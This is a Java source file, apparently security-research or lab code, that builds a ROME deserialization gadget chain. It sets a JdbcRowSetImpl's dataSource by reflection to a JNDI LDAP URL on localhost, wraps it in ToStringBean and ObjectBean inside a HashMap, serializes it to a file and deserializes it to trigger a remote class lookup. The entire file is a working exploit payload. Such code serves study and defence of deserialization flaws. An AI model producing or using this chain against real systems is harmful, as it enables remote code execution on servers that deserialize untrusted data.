package org.dili.rome;

import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.sql.rowset.BaseRowSet;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;

public class JdbcRowExp {
    public static void main(String[] args) throws Exception{
        // ldap url
        String url = "ldap://127.0.0.1:1389/nils4f";

        // 创建JdbcRowSetImpl对象
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        Field dataSource = BaseRowSet.class.getDeclaredField("dataSource");
        dataSource.setAccessible(true);
        dataSource.set(jdbcRowSet, url);

        // 创建ToStringBean对象
        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet);
        // 创建ObjectBean
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);

        // 创建HashMap
        HashMap hashMap = new HashMap();
        hashMap.put(objectBean, "bbbb");

        // 序列化
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("JdbcRowExp.bin"));
        objectOutputStream.writeObject(hashMap);
        objectOutputStream.close();

        // 反序列化
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("JdbcRowExp.bin"));
        objectInputStream.readObject();
        objectInputStream.close();
    }
}
